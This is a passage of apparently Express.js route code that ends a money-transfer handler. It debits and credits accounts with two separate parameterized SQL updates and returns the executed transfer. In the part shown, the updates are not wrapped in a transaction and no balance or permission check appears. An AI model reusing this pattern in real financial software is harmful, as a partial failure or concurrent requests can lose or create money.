  await db.query(
    `UPDATE accounts SET balance = balance - $1 WHERE account_number = $2`,
    [t.amount, t.from_account]
  );
  await db.query(
    `UPDATE accounts SET balance = balance + $1 WHERE account_number = $2`,
    [t.amount, t.to_account]
  );

  res.json({ success: true, executed: t });
});

module.exports = router;
